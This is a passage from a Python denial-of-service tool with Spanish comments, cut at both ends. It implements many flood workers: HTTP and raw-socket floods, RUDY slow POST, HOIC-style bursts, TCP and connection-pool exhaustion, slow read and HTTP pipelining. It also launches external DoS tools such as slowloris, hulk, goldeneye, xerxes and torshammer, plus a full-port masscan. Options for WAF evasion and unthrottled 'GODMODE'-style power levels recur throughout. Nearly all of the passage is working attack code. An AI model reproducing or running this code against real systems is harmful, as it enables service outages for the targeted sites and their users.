                            # Rate limiting, reducir tasa
                            rate_adjustment = max(rate_adjustment * 0.8, 0.5)
                        elif response.status_code >= 500:
                            # Errores del servidor, reducir tasa ligeramente
                            rate_adjustment = max(rate_adjustment * 0.9, 0.7)
                        last_rate_check = time.time()
                    
                    # Rate limiting adaptativo - más agresivo
                    # Para niveles altos, sin sleep para máximo throughput
                    if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"]:
                        # Sin sleep - máximo throughput
                        pass
                    elif POWER_LEVEL in ["EXTREME", "HEAVY"]:
                        # Sleep mínimo
                        time.sleep(0.001)
                    else:
                        # Rate adaptativo para niveles menores
                        base_rate = MULTIPLIER * 30  # Aumentado para más requests
                        if rate_adjustment != 1.0:
                            time.sleep(1.0 / (base_rate * rate_adjustment))
                        else:
                            time.sleep(1.0 / base_rate)
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e))
                    attack_stats["requests_sent"] += 1  # Contar intento aunque falle
                    error_msg = str(e)
                    # Loggear errores importantes
                    if "Connection" in error_msg or "timeout" in error_msg.lower() or "SSL" in error_msg:
                        if request_count % 10 == 0:  # Loggear cada 10 errores para no saturar
                            log_message("WARN", f"Worker {worker_id}: {error_msg[:100]}")
                    elif DEBUG_MODE:
                        log_message("DEBUG", f"Error en worker {worker_id}: {error_msg[:100]}")
                    # Pequeño delay en caso de error para no saturar
                    time.sleep(0.01)
                
        except ImportError:
            log_message("ERROR", "requests no disponible, omitiendo ataque HTTP personalizado")
        except Exception as e:
            log_message("ERROR", f"Error en worker {worker_id}: {e}")
    
    # Crear workers optimizados CON PROTECCIÓN CRÍTICA
    # Verificar memoria ANTES de crear workers para evitar reinicio del sistema
    memory_percent = 0
    memory_available_gb = 0
    try:
        import psutil
        memory = psutil.virtual_memory()
        memory_percent = memory.percent
        memory_available_gb = round(memory.available / (1024**3), 2)
        
        # PROTECCIÓN CRÍTICA: Si memoria está muy alta, NO iniciar o reducir drásticamente
        if memory_percent >= MEMORY_THRESHOLD_OOM:
            log_message("CRITICAL", f"🚨 Memoria OOM ({memory_percent:.1f}%, {memory_available_gb} GB disponibles) - NO iniciando workers para proteger sistema")
            return []
        
        if memory_percent >= MEMORY_THRESHOLD_CRITICAL:
            log_message("WARN", f"⚠️ Memoria CRÍTICA ({memory_percent:.1f}%, {memory_available_gb} GB disponibles) - Reduciendo workers a mínimo")
            max_safe_workers = 20  # Mínimo absoluto
        elif memory_percent >= MEMORY_THRESHOLD_WARN:
            log_message("WARN", f"⚠️ Memoria ALTA ({memory_percent:.1f}%, {memory_available_gb} GB disponibles) - Reduciendo workers")
            max_safe_workers = min(MAX_THREADS, 100)  # Reducir significativamente
        else:
            max_safe_workers = MAX_THREADS
    except:
        max_safe_workers = min(MAX_THREADS, 200)  # Conservador por defecto
    
    # Calcular base_workers según nivel de potencia
    if POWER_LEVEL in ["GODMODE"]:
        base_workers = MULTIPLIER * 50
    elif POWER_LEVEL in ["APOCALYPSE"]:
        base_workers = MULTIPLIER * 40
    elif POWER_LEVEL in ["DEVASTATOR"]:
        base_workers = MULTIPLIER * 35
    elif POWER_LEVEL in ["EXTREME"]:
        base_workers = MULTIPLIER * 30
    elif POWER_LEVEL in ["HEAVY"]:
        base_workers = MULTIPLIER * 25
    elif POWER_LEVEL in ["MEDIUM"]:
        base_workers = MULTIPLIER * 20
    else:
        base_workers = MULTIPLIER * 15
    
    # Aplicar límite de seguridad basado en memoria
    num_workers = min(base_workers, max_safe_workers)
    
    # Límite absoluto de seguridad (nunca más de 500 workers para evitar reinicios)
    num_workers = min(num_workers, 500)
    
    # Asegurar mínimo de workers
    if num_workers < 5:
        num_workers = 5
    
    # Auto-scaling: ajustar workers según recursos disponibles (PERO con límites de seguridad)
    if AUTO_SCALING and memory_percent < MEMORY_THRESHOLD_WARN:
        try:
            import psutil
            cpu_count = os.cpu_count() or 1
            memory_available = psutil.virtual_memory().available / (1024**3)  # GB
            
            # Ajustar según CPU (solo si memoria está bien)
            if cpu_count >= 8 and memory_percent < 50:
                num_workers = min(num_workers * 1.2, max_safe_workers)
            if cpu_count >= 16 and memory_percent < 40:
                num_workers = min(num_workers * 1.1, max_safe_workers)
            
            # Ajustar según memoria disponible (solo si hay suficiente)
            if memory_available >= 16 and memory_percent < 50:  # 16GB+ y menos del 50% usado
                num_workers = min(num_workers * 1.2, max_safe_workers)
            if memory_available >= 32 and memory_percent < 40:  # 32GB+ y menos del 40% usado
                num_workers = min(num_workers * 1.1, max_safe_workers)
                
        except:
            pass
    
    threads = []
    
    for i in range(int(num_workers)):
        thread = threading.Thread(target=worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {int(num_workers)} workers HTTP optimizados para target: {TARGET}")
    
    # Esperar a que los threads terminen (o al menos iniciar)
    time.sleep(1)  # Dar tiempo para que los threads inicien
    
    # Verificar que los threads estén activos
    active_threads = sum(1 for t in threads if t.is_alive())
    log_message("INFO", f"Threads activos: {active_threads}/{int(num_workers)}")
    
    return threads

def deploy_socket_based_attack():
    """Ataque de bajo nivel usando sockets raw para máximo rendimiento"""
    print_color("🔥 Desplegando ataque socket-based de bajo nivel...", Colors.RED, True)
    
    def socket_worker(worker_id: int):
        """Worker usando sockets raw para máximo rendimiento"""
        try:
            import struct
            import ssl
            
            end_time = time.time() + DURATION
            request_count = 0
            
            # Crear socket y mantenerlo abierto
            sock = None
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Reutilizar socket si está disponible
                    if sock is None or not SOCKET_REUSE:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        
                        if PROTOCOL == "https":
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            sock = context.wrap_socket(sock, server_hostname=DOMAIN)
                        
                        sock.connect((DOMAIN, PORT))
                        sock.settimeout(5)
                    
                    # Construir request HTTP básico con evasión
                    headers = get_random_headers()
                    host_header = f"Host: {DOMAIN}\r\n"
                    
                    # Aplicar evasión a headers para socket-based
                    # Filtrar headers HTTP/2 que no funcionan en HTTP/1.1
                    filtered_headers = {k: v for k, v in headers.items() if not k.startswith(':')}
                    other_headers = "\r\n".join([f"{k}: {v}" for k, v in filtered_headers.items()]) + "\r\n"
                    
                    # Aplicar evasión a la URL
                    path = "/"
                    if EVASION_TECHNIQUES.get("case_variation") and random.random() < 0.3:
                        path = "/" + ''.join(random.choices(['/', '?', '&'], k=random.randint(0, 2)))
                    
                    # Request GET optimizado con evasión
                    method = "GET"
                    if EVASION_TECHNIQUES.get("method_tampering") and WAF_BYPASS and random.random() < 0.1:
                        method = random.choice(["GET", "HEAD", "OPTIONS"])
                    
                    request = f"{method} {path} HTTP/1.1\r\n{host_header}{other_headers}\r\n"
                    
                    sock.sendall(request.encode())
                    
                    # Leer respuesta (solo header para velocidad)
                    response = sock.recv(4096)
                    
                    if response:
                        # Extraer status code
                        status_line = response.decode('utf-8', errors='ignore').split('\n')[0]
                        if 'HTTP' in status_line:
                            try:
                                status_code = int(status_line.split()[1])
                                attack_stats["http_codes"][status_code] += 1
                            except:
                                attack_stats["http_codes"][200] += 1
                        
                        attack_stats["requests_sent"] += 1
                        attack_stats["responses_received"] += 1
                        request_count += 1
                    
                    # Sin sleep para máximo throughput
                    if POWER_LEVEL not in ["DEVASTATOR", "APOCALYPSE", "GODMODE"]:
                        time.sleep(0.001)  # Sleep mínimo
                    
                except (socket.error, ssl.SSLError, ConnectionResetError, BrokenPipeError):
                    # Reconectar
                    try:
                        if sock:
                            sock.close()
                    except:
                        pass
                    sock = None
                    time.sleep(0.1)  # Breve pausa antes de reconectar
                except Exception as e:
                    if DEBUG_MODE:
                        log_message("DEBUG", f"Error en socket worker {worker_id}: {e}")
                    try:
                        if sock:
                            sock.close()
                    except:
                        pass
                    sock = None
            
            # Cerrar socket al finalizar
            try:
                if sock:
                    sock.close()
            except:
                pass
                
        except Exception as e:
            log_message("ERROR", f"Error en socket worker {worker_id}: {e}")
    
    # Workers socket-based para máximo rendimiento
    num_workers = min(MULTIPLIER * 20, MAX_THREADS // 2)
    
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=socket_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers socket-based")
    return threads

def deploy_locust_attack():
    """Despliega ataque con Locust (muy potente)"""
    if not check_command_exists("locust"):
        log_message("WARN", "locust no disponible, omitiendo...")
        return None
    
    # Crear script de Locust dinámico
    locust_script = CONFIG_DIR / "locust_script.py"
    
    script_content = f"""
from locust import HttpUser, task, between
import random

class LoadTestUser(HttpUser):
    wait_time = between(0.1, 0.5)
    
    @task(8)
    def post_large(self):
        payload_size = {PAYLOAD_SIZE_KB * 1024}
        payload = ''.join(['A' for _ in range(payload_size)])
        self.client.post("/", data=payload, verify=False, timeout=5)
    
    @task(2)
    def get_page(self):
        self.client.get("/", verify=False, timeout=5)
    
    def on_start(self):
        self.client.verify = False
"""
    
    with open(locust_script, "w") as f:
        f.write(script_content)
    
    num_users = min(MAX_CONNECTIONS, 10000)
    spawn_rate = min(MULTIPLIER * 100, 1000)
    
    cmd = [
        "locust",
        "-f", str(locust_script),
        "--headless",
        "-u", str(num_users),
        "-r", str(spawn_rate),
        "-t", f"{DURATION}s",
        "--host", TARGET,
        "--html", str(REPORTS_DIR / f"locust_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")
    ]
    
    log_message("INFO", f"Desplegando locust: users={num_users}, spawn_rate={spawn_rate}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando locust: {e}")
        return None

def deploy_k6_attack():
    """Despliega ataque con K6 (muy eficiente)"""
    if not check_command_exists("k6"):
        log_message("WARN", "k6 no disponible, omitiendo...")
        return None
    
    # Crear script K6
    k6_script = CONFIG_DIR / "k6_script.js"
    
    script_content = f"""
import http from 'k6/http';
import {{ check }} from 'k6';

export const options = {{
    stages: [
        {{ duration: '{DURATION}s', target: {MAX_CONNECTIONS} }}
    ],
    thresholds: {{
        http_req_duration: ['p(95)<2000'],
    }},
}};

export default function () {{
    const payload = {'A'.repeat({PAYLOAD_SIZE_KB * 1024})};
    const headers = {{ 'User-Agent': 'LoadTest-Enterprise/1.0' }};
    
    const res = http.post('{TARGET}', payload, {{ headers: headers, params: {{ verify: false }} }});
    check(res, {{ 'status was 200': (r) => r.status == 200 }});
}}
"""
    
    with open(k6_script, "w") as f:
        f.write(script_content)
    
    cmd = ["k6", "run", str(k6_script)]
    
    log_message("INFO", f"Desplegando k6: connections={MAX_CONNECTIONS}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando k6: {e}")
        return None

def deploy_masscan_attack():
    """Despliega scan masivo de puertos (para IPs)"""
    if not check_command_exists("masscan"):
        log_message("WARN", "masscan no disponible, omitiendo...")
        return None
    
    if TARGET_TYPE != "IP":
        return None
    
    # Escanear puertos comunes masivamente
    cmd = [
        "masscan",
        IP_ADDRESS,
        "-p1-65535",
        "--rate", str(MULTIPLIER * 1000),
        "--wait", "0"
    ]
    
    log_message("INFO", f"Desplegando masscan en {IP_ADDRESS}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando masscan: {e}")
        return None

def deploy_goldeneye_attack():
    """Despliega ataque con GoldenEye"""
    if not check_command_exists("goldeneye"):
        log_message("WARN", "goldeneye no disponible, omitiendo...")
        return None
    
    workers = min(MULTIPLIER * 5, 100)
    
    cmd = [
        "goldeneye",
        TARGET,
        "-w", str(workers),
        "-s", str(DURATION * 1000),  # GoldenEye usa ms
        "-m", "get" if not USE_LARGE_PAYLOADS else "post"
    ]
    
    log_message("INFO", f"Desplegando goldeneye: workers={workers}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando goldeneye: {e}")
        return None

def deploy_hulk_attack():
    """Despliega ataque con HULK"""
    if not check_command_exists("hulk"):
        log_message("WARN", "hulk no disponible, omitiendo...")
        return None
    
    threads = min(MULTIPLIER * 5, 500)
    
    cmd = [
        "hulk",
        TARGET,
        "-t", str(threads),
        "-c", str(MULTIPLIER * 100)
    ]
    
    log_message("INFO", f"Desplegando hulk: threads={threads}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando hulk: {e}")
        return None

def deploy_slowloris():
    """Despliega ataque Slowloris (slow HTTP attack)"""
    if not check_command_exists("slowloris"):
        log_message("WARN", "slowloris no disponible, omitiendo...")
        return None
    
    workers = min(MULTIPLIER * 10, 1000)
    sockets = min(MAX_CONNECTIONS, 10000)
    
    cmd = [
        "slowloris",
        "-dns", DOMAIN,
        "-p", str(PORT),
        "-s", str(sockets),
        "-ua",
        "-x"
    ]
    
    log_message("INFO", f"Desplegando slowloris: workers={workers}, sockets={sockets}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando slowloris: {e}")
        return None

def deploy_pyloris():
    """Despliega ataque PyLoris (Python slowloris implementation)"""
    if not check_command_exists("pyloris"):
        log_message("WARN", "pyloris no disponible, omitiendo...")
        return None
    
    threads = min(MULTIPLIER * 10, 1000)
    sockets_per_thread = min(MAX_CONNECTIONS // threads, 100)
    
    cmd = [
        "pyloris",
        TARGET,
        "-t", str(threads),
        "-s", str(sockets_per_thread),
        "-d", str(DURATION)
    ]
    
    log_message("INFO", f"Desplegando pyloris: threads={threads}, sockets_per_thread={sockets_per_thread}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando pyloris: {e}")
        return None

def deploy_xerxes():
    """Despliega ataque Xerxes (high-performance stress tool)"""
    if not check_command_exists("xerxes"):
        log_message("WARN", "xerxes no disponible, omitiendo...")
        return None
    
    threads = min(MULTIPLIER * 20, 5000)
    
    cmd = [
        "xerxes",
        DOMAIN,
        str(PORT),
        str(threads)
    ]
    
    log_message("INFO", f"Desplegando xerxes: threads={threads}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando xerxes: {e}")
        return None

def deploy_ddos_ripper():
    """Despliega ataque DDoS-Ripper"""
    if not check_command_exists("ddos-ripper"):
        log_message("WARN", "ddos-ripper no disponible, omitiendo...")
        return None
    
    threads = min(MULTIPLIER * 15, 500)
    
    cmd = [
        "ddos-ripper",
        "-T", str(threads),
        "-t", TARGET
    ]
    
    log_message("INFO", f"Desplegando ddos-ripper: threads={threads}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando ddos-ripper: {e}")
        return None

def deploy_torshammer():
    """Despliega ataque Torshammer (Tor-based stress)"""
    if not check_command_exists("torshammer"):
        log_message("WARN", "torshammer no disponible, omitiendo...")
        return None
    
    threads = min(MULTIPLIER * 10, 200)
    
    cmd = [
        "torshammer",
        "-t", str(threads),
        "-r", str(MULTIPLIER * 100),
        TARGET
    ]
    
    log_message("INFO", f"Desplegando torshammer: threads={threads}")
    
    if DRY_RUN:
        print_color(f"DRY-RUN: {' '.join(cmd)}", Colors.YELLOW)
        return None
    
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        running_processes.append(process)
        return process
    except Exception as e:
        log_message("ERROR", f"Error desplegando torshammer: {e}")
        return None

def deploy_rudy():
    """Despliega ataque R-U-Dead-Yet (RUDY) - slow POST attack"""
    print_color("🐢 Desplegando ataque RUDY (R-U-Dead-Yet)...", Colors.YELLOW, True)
    
    def rudy_worker(worker_id: int):
        """Worker RUDY - envía POST requests muy lentamente"""
        try:
            import requests
            import socket
            
            end_time = time.time() + DURATION
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Crear conexión
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((DOMAIN, PORT))
                    
                    # Enviar POST request muy lentamente (slow POST)
                    post_data = "a=1" + "&x=" + "X" * (PAYLOAD_SIZE_KB * 100)  # Payload grande
                    
                    request = f"POST / HTTP/1.1\r\n"
                    request += f"Host: {DOMAIN}\r\n"
                    request += f"Content-Type: application/x-www-form-urlencoded\r\n"
                    request += f"Content-Length: {len(post_data)}\r\n"
                    request += "\r\n"
                    
                    # Enviar header lentamente
                    sock.sendall(request.encode())
                    
                    # Enviar data muy lentamente (1 byte cada 10 segundos)
                    for char in post_data:
                        if time.time() >= end_time or not monitoring_active:
                            break
                        sock.send(char.encode())
                        time.sleep(10)  # Slow POST
                    
                    attack_stats["requests_sent"] += 1
                    
                    try:
                        sock.close()
                    except:
                        pass
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e))
                    if DEBUG_MODE:
                        log_message("DEBUG", f"Error en RUDY worker {worker_id}: {e}")
                    time.sleep(1)
                    
        except Exception as e:
            log_message("ERROR", f"Error en RUDY worker {worker_id}: {e}")
    
    # Workers RUDY
    num_workers = min(MULTIPLIER * 5, 50)  # Menos workers para slow POST
    
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=rudy_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers RUDY")
    return threads

def deploy_hoic():
    """Despliega ataque HOIC (High Orbit Ion Cannon) - simulado"""
    print_color("🚀 Desplegando ataque HOIC (High Orbit Ion Cannon)...", Colors.CYAN, True)
    
    def hoic_worker(worker_id: int):
        """Worker HOIC - múltiples requests simultáneos"""
        try:
            import requests
            from requests.adapters import HTTPAdapter
            from urllib3.util.retry import Retry
            
            session = requests.Session()
            adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100)
            session.mount("http://", adapter)
            session.mount("https://", adapter)
            
            end_time = time.time() + DURATION
            
            # HOIC envía múltiples requests en ráfagas
            while time.time() < end_time and monitoring_active:
                try:
                    # Ráfaga de requests
                    for _ in range(MULTIPLIER * 5):
                        try:
                            headers = get_random_headers()
                            headers["Accept-Encoding"] = "gzip, deflate"
                            headers["Connection"] = "keep-alive"
                            
                            response = session.get(
                                TARGET,
                                headers=headers,
                                timeout=5,
                                verify=False
                            )
                            
                            attack_stats["requests_sent"] += 1
                            attack_stats["responses_received"] += 1
                            attack_stats["http_codes"][response.status_code] += 1
                            
                        except:
                            attack_stats["requests_sent"] += 1
                            
                        time.sleep(0.01)  # Muy rápido
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    if DEBUG_MODE:
                        log_message("DEBUG", f"Error en HOIC worker {worker_id}: {e}")
                    time.sleep(1)
                    
        except Exception as e:
            log_message("ERROR", f"Error en HOIC worker {worker_id}: {e}")
    
    # Workers HOIC
    num_workers = min(MULTIPLIER * 15, 500)
    
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=hoic_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers HOIC")
    return threads

def deploy_reaper():
    """Despliega ataque Reaper - múltiples técnicas combinadas"""
    print_color("🌾 Desplegando ataque Reaper...", Colors.RED, True)
    
    # Reaper combina múltiples técnicas
    deploy_slowloris()
    deploy_pyloris()
    deploy_hping3_flood()
    deploy_custom_http_attack()
    
    log_message("INFO", "Ataque Reaper desplegado (combinación múltiple)")

def deploy_distributed_attack():
    """Despliega ataque distribuido en múltiples nodos"""
    if not DISTRIBUTED_MODE or not WORKER_NODES:
        return None
    
    print_color("🌐 Desplegando ataque distribuido...", Colors.CYAN, True)
    
    # Para implementación futura - comunicación con nodos worker
    log_message("INFO", f"Modo distribuido: {len(WORKER_NODES)} nodo(s) worker")
    
    # Aquí iría la lógica de distribución de carga
    return None

def deploy_tcp_flood_advanced():
    """Ataque TCP Flood avanzado - agota recursos de conexión del target"""
    print_color("🌊 Desplegando TCP Flood avanzado...", Colors.RED, True)
    log_message("INFO", "Iniciando TCP Flood avanzado - agotamiento de conexiones")
    
    def tcp_flood_worker(worker_id: int):
        """Worker TCP flood - crea y mantiene conexiones TCP abiertas"""
        end_time = time.time() + DURATION
        connections = []
        max_connections_per_worker = min(MAX_CONNECTIONS // 10, 1000)
        
        try:
            while time.time() < end_time and monitoring_active:
                try:
                    # Crear nueva conexión TCP
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    
                    # Intentar conectar
                    try:
                        sock.connect((IP_ADDRESS or DOMAIN, PORT))
                        connections.append(sock)
                        attack_stats["requests_sent"] += 1
                        
                        # Mantener conexión abierta el mayor tiempo posible
                        # Enviar datos periódicamente para mantenerla activa
                        if len(connections) % 10 == 0:
                            try:
                                sock.send(b"GET / HTTP/1.1\r\nHost: " + DOMAIN.encode() + b"\r\n\r\n")
                            except:
                                pass
                    except (socket.error, ConnectionRefusedError, TimeoutError):
                        sock.close()
                        attack_stats["errors"].append("TCP connection refused")
                    
                    # Limpiar conexiones cerradas
                    connections = [c for c in connections if not getattr(c, '_closed', False)]
                    
                    # Si tenemos muchas conexiones, mantenerlas abiertas
                    if len(connections) >= max_connections_per_worker:
                        # Mantener conexiones abiertas sin crear nuevas
                        time.sleep(0.1)
                    else:
                        # Crear más conexiones rápidamente
                        time.sleep(0.01)
                    
                except Exception as e:
                    if DEBUG_MODE:
                        log_message("DEBUG", f"Error en TCP flood worker {worker_id}: {e}")
                    time.sleep(0.05)
            
            # Cerrar todas las conexiones al finalizar
            for sock in connections:
                try:
                    sock.close()
                except:
                    pass
                    
        except Exception as e:
            log_message("ERROR", f"Error fatal en TCP flood worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 10, MAX_THREADS // 4)
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=tcp_flood_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers TCP flood")
    return threads

def deploy_connection_exhaustion():
    """Ataque de agotamiento de conexiones - satura el pool de conexiones del servidor"""
    print_color("💀 Desplegando Connection Exhaustion Attack...", Colors.RED, True)
    log_message("INFO", "Iniciando Connection Exhaustion - saturación de pool de conexiones")
    
    def exhaustion_worker(worker_id: int):
        """Worker que agota conexiones manteniéndolas abiertas"""
        end_time = time.time() + DURATION
        active_connections = []
        max_connections = min(MAX_CONNECTIONS // 5, 500)
        
        try:
            import requests
            from requests.adapters import HTTPAdapter
            from urllib3.util.retry import Retry
            
            session = requests.Session()
            retry = Retry(total=0)  # Sin retries
            adapter = HTTPAdapter(
                max_retries=retry,
                pool_connections=1,
                pool_maxsize=max_connections,
                pool_block=False
            )
            session.mount("http://", adapter)
            session.mount("https://", adapter)
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Crear conexión y mantenerla abierta
                    response = session.get(
                        TARGET,
                        headers=get_random_headers(),
                        timeout=30,  # Timeout largo para mantener conexión
                        verify=False,
                        stream=True  # Stream para mantener conexión abierta
                    )
                    
                    active_connections.append(response)
                    attack_stats["requests_sent"] += 1
                    
                    # Leer solo una pequeña parte para mantener conexión activa
                    try:
                        next(response.iter_content(1))
                    except:
                        pass
                    
                    # Limpiar conexiones antiguas periódicamente
                    if len(active_connections) > max_connections:
                        try:
                            old_conn = active_connections.pop(0)
                            old_conn.close()
                        except:
                            pass
                    
                    # Crear nuevas conexiones rápidamente
                    time.sleep(0.05)
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.1)
            
            # Cerrar todas las conexiones
            for conn in active_connections:
                try:
                    conn.close()
                except:
                    pass
                    
        except Exception as e:
            log_message("ERROR", f"Error en exhaustion worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 8, MAX_THREADS // 3)
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=exhaustion_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers connection exhaustion")
    return threads

def deploy_slow_read_attack():
    """Ataque Slow Read - lee respuestas muy lentamente agotando recursos"""
    print_color("🐌 Desplegando Slow Read Attack...", Colors.YELLOW, True)
    log_message("INFO", "Iniciando Slow Read Attack - lectura lenta de respuestas")
    
    def slow_read_worker(worker_id: int):
        """Worker que lee respuestas muy lentamente"""
        end_time = time.time() + DURATION
        request_count = 0
        
        try:
            import requests
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Request con stream para leer lentamente
                    response = requests.get(
                        TARGET,
                        headers=get_random_headers(),
                        timeout=60,  # Timeout largo
                        verify=False,
                        stream=True
                    )
                    
                    attack_stats["requests_sent"] += 1
                    request_count += 1
                    
                    # Leer muy lentamente (1 byte cada segundo)
                    try:
                        for chunk in response.iter_content(chunk_size=1):
                            if not chunk:
                                break
                            time.sleep(1)  # Leer muy lento
                            if time.time() >= end_time:
                                break
                    except:
                        pass
                    
                    response.close()
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.5)
                    
        except Exception as e:
            log_message("ERROR", f"Error en slow read worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 5, 100)  # Menos workers pero más efectivos
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=slow_read_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers slow read")
    return threads

def deploy_http_pipelining_flood():
    """Ataque HTTP Pipelining - envía múltiples requests en una sola conexión"""
    print_color("📡 Desplegando HTTP Pipelining Flood...", Colors.CYAN, True)
    log_message("INFO", "Iniciando HTTP Pipelining Flood - múltiples requests por conexión")
    
    def pipelining_worker(worker_id: int):
        """Worker que envía múltiples requests en pipeline"""
        end_time = time.time() + DURATION
        request_count = 0
        
        try:
            import ssl
            
            while time.time() < end_time and monitoring_active:
                try:
                    # Crear conexión TCP
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    
                    if PROTOCOL == "https":
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=DOMAIN)
                    
                    sock.connect((DOMAIN, PORT))
                    
                    # Enviar múltiples requests en pipeline (sin esperar respuesta)
                    headers = get_random_headers()
                    host_header = f"Host: {DOMAIN}\r\n"
                    other_headers = "\r\n".join([f"{k}: {v}" for k, v in headers.items()]) + "\r\n"
                    
                    # Enviar 10-20 requests en pipeline
                    pipeline_count = random.randint(10, 20)
                    for i in range(pipeline_count):
                        request = f"GET /?pipeline={i} HTTP/1.1\r\n{host_header}{other_headers}\r\n"
                        sock.sendall(request.encode())
                        attack_stats["requests_sent"] += 1
                        request_count += 1
                    
                    # Leer todas las respuestas
                    try:
                        response = sock.recv(8192)
                        if response:
                            attack_stats["responses_received"] += 1
                            # Intentar extraer status codes
                            response_str = response.decode('utf-8', errors='ignore')
                            for line in response_str.split('\n'):
                                if 'HTTP' in line and len(line.split()) > 1:
                                    try:
                                        status_code = int(line.split()[1])
                                        attack_stats["http_codes"][status_code] += 1
                                    except:
                                        pass
                    except:
                        pass
                    
                    sock.close()
                    
                    # Pequeño delay entre pipelines
                    time.sleep(0.1)
                    
                except Exception as e:
                    attack_stats["errors"].append(str(e)[:50])
                    time.sleep(0.2)
                    
        except Exception as e:
            log_message("ERROR", f"Error en pipelining worker {worker_id}: {e}")
    
    num_workers = min(MULTIPLIER * 6, MAX_THREADS // 4)
    threads = []
    for i in range(num_workers):
        thread = threading.Thread(target=pipelining_worker, args=(i,), daemon=True)
        thread.start()
        threads.append(thread)
    
    log_message("INFO", f"Desplegados {num_workers} workers HTTP pipelining")
    return threads

def deploy_ssl_renegotiation_attack():
